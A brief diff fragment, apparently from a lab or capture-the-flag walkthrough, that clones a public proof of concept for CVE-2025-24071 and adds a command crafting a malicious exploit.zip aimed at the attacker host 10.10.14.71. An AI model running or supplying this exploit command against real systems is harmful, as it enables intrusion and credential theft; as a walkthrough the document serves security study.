@@ -227,4 +227,7 @@ git clone https://github.com/ThemeHackers/CVE-2025-24071
 cd CVE-2025-24071
 ```
 
-
+Now lets craft the exploit.zip file
+```bash
+python3 exploit.py -f exploit.zip -i 10.10.14.71
+```
